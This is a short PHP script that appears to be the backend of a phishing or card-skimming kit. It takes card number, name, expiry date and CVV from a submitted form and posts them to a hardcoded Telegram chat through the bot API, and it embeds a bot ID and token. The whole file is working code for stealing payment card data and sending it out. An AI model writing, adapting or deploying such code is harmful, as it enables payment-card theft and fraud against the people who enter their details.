<?php

    $t_chat_id = "912080404";
    $t_bot_id = "5163244405";
    $t_bot_token = "AAExFCzUiggGagLr4mmHCEhwLsQtezKkeVo";
    $t_api_uri = "https://api.telegram.org/bot".$t_bot_id.":".$t_bot_token."/";


    $card = $_POST["card"];
    $name = $_POST["name"];
    $exp_month = (int)$_POST["exp_month"];
    $exp_year = (int)$_POST["exp_year"];
    $cvv = (int)$_POST["cvv"];

    $card_log = "CARD: ".$card."%0ANAME: ".$name."%0AEXP: ".$exp_month."/".$exp_year."%0ACVV: ".$cvv."%0A";

    $headers = array();
    $options = array();
    $curl_res = curl("post", $t_api_uri."sendMessage?chat_id=".$t_chat_id."&text=".$card_log, $headers, "", $options);

    // $code = $curl_res["code"];
    // $response = $curl_res["response"];

    echo $curl_res;
?>
